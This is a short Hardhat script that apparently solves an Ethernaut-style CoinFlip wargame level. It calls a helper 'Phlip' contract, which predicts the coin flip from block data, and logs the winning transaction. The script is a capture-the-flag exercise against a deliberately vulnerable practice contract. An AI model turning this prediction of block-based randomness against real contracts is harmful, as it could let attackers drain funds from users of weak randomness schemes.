import { BigNumber } from "ethers"
import { ethers } from "hardhat"
import { text } from "stream/consumers"

const LEVEL_ADDRESS = "0xD72C3d6c4fCcBb99EaD3DC4c23Cb6417d7db7771"
const LEVEL_ABI = [
    "function flip(bool) public returns (bool)",
    "function consecutiveWins() public view returns (uint256)"
]
const PHLIP_ADDRESS = "0x7B60c44a90d80b4B409c1deFe365085a439996da"
async function pwn() {
    //get contract isntance of coinflipX
    //call flip(_bool)X
    //solution revolves around spoofing the blockValue scriptside.
    const signer = (await ethers.getSigners())[0]
    const target = await new ethers.Contract(LEVEL_ADDRESS, LEVEL_ABI, signer)
    const contract = await ethers.getContractAt("Phlip", PHLIP_ADDRESS, signer)
    const consecutiveWins = await target.consecutiveWins()
    try {
        console.log(`Flipping Coin...`)
        console.log(`Consecutive: ${consecutiveWins}`)
        const call = await contract.phlip({
            gasLimit: BigNumber.from("500000"),
        })
        const receipt = await call.wait()
        console.log(`PWNED @ Block ${receipt.blockNumber}
                    TXHASH: ${receipt.transactionHash}
            `)
    } catch (e) {
        console.log("some stupid rpc shit happened") //this one really doesnt work well weith truffle dashboard because of lag in clicking between windows
    }

}

pwn()